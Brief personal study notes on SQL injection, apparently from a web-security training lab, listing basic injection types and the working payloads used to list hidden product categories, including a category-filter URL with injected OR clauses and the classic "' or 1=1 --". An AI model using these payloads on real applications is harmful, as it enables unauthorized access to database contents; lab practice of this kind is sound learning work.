Basic Methods:
    Retrieving hidden data - where you can modify an SQL query to return additional results.
    Subverting application logic - where you can change a query to interfere with the application's logic.
    UNION attacks- where you can retrieve data from different database tables.
    Examining the database - where you can extract information about the version and structure of the database.
    Blind SQL injection -  where the results of a query you control are not returned in the application's responses.

You need to get all categories released and unlreleased:
' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
filter?category=Clothing%2c+shoes+and+accessories' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
Above code worked but only because corporate firewall was blocking the real solution: ' or 1=1 --

You can do this one from the GUI but it says to use intercept and modify from BURP. I thought BURP requirement was why I was failing. It doesn't care about client side
it was a firewall.
